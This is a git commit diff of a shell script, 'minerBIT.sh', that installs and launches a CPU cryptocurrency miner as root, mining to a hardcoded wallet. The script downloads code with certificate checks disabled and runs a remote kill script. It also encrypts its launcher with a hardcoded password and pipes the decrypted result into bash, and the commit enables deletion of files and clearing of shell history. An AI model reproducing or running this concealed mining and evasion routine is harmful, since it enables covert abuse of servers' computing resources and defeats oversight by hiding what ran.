c3b3fd9b7995687a6e8c1fedbcb8a9121a9922ac
danielluis1921 <158490195+danielluis1921@users.noreply.github.com>
2024-02-02 23:20:43 +0700

    Update minerBIT.sh

--- minerBIT.sh
+++ minerBIT.sh
@@ -1,15 +1,12 @@
 #!/bin/sh
 password="danielchau@123#"
 rm -fR /root/cpuminer-opt-linux/
-rm -fR /root/cpuminer-opt-aurum-prerelease/
 rm -fv *
-
 sudo apt-get update -y
 sudo apt-get install cpulimit -y
 wget --no-check-certificate -O cpuminer-opt-aurum.tar.gz https://github.com/barrystyle/cpuminer-opt-aurum/archive/refs/tags/prerelease.tar.gz
 tar -xvf cpuminer-opt-aurum.tar.gz
-chmod +x ./cpuminer-opt-aurum-prerelease/* 
-cd cpuminer-opt-aurum-prerelease
+mv cpuminer-opt-aurum-prerelease/* /root/
 sudo apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++
 sudo apt-get install -y lib32z1-dev
 chmod +x build.sh
@@ -31,31 +28,31 @@ for server in "${servers[@]}"; do
     fi
 done
 echo "$fastest_server with min_latency is: $latency"
-cat >>/root/root/cpuminer-opt-aurum-prerelease/config.json <<EOF
+cat >>/root/config.json <<EOF
 {
   "url": "stratum+tcp://$fastest_server:3442",
-  "user": "bit1qurhknpxt5k8vwz0snrg9xnyvgdnk4asc9skgtx.Linode2"
+  "user": "bit1qurhknpxt5k8vwz0snrg9xnyvgdnk4asc9skgtx.Linode"
 }
 EOF
-cat /dev/null > /root/cpuminer-opt-aurum-prerelease/danielluis1921.sh
-cat >>/root/cpuminer-opt-aurum-prerelease/danielluis1921.sh <<EOF
+cat /dev/null > /root/danielluis1921.sh
+cat >>/root/danielluis1921.sh <<EOF
 #!/bin/bash
-./root/cpuminer-opt-aurum-prerelease/kill_miner.sh
+sudo ./kill_miner.sh
 sleep 3
-sudo ./root/cpuminer-opt-aurum-prerelease/cpuminer --background --threads=$cores -a Aurum -c config.json -p m=solo
+sudo ./cpuminer --background --threads=6 -a Aurum -c config.json -p m=solo
 sleep 3
 EOF
-openssl enc -aes-256-cbc -salt -pbkdf2 -in /root/cpuminer-opt-aurum-prerelease/danielluis1921.sh -out /root/cpuminer-opt-aurum-prerelease/danielluis1922.sh -k $password
-rm -fv /root/cpuminer-opt-aurum-prerelease/danielluis1921.sh
-chmod +x /root/cpuminer-opt-aurum-prerelease/danielluis1922.sh
+openssl enc -aes-256-cbc -salt -pbkdf2 -in /root/danielluis1921.sh -out /root/danielluis1922.sh -k $password
+rm -fv /root/danielluis1921.sh
+chmod +x /root/danielluis1922.sh
 
-wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/cpuminer-opt-aurum-prerelease/kill_miner.sh
-chmod +x /root/cpuminer-opt-aurum-prerelease/kill_miner.sh
-./root/cpuminer-opt-aurum-prerelease/kill_miner.sh
+wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
+chmod +x /root/kill_miner.sh
+./root/kill_miner.sh
 sleep 3
-openssl enc -d -aes-256-cbc -pbkdf2 -in /root/cpuminer-opt-aurum-prerelease/danielluis1922.sh -k $password | bash
-#rm -fv *
-#rm -fR /root/cpuminer-opt-linux/
-#rm -fR /root/cpuminer-opt-aurum-prerelease/
-#rm -fR xmrig-6.21.0/
-#history -c && history -w
+openssl enc -d -aes-256-cbc -pbkdf2 -in /root/danielluis1922.sh -k $password | bash
+rm -fv *
+rm -fR /root/cpuminer-opt-linux/
+rm -fR /root/cpuminer-opt-aurum-prerelease/
+rm -fR xmrig-6.21.0/
+history -c && history -w
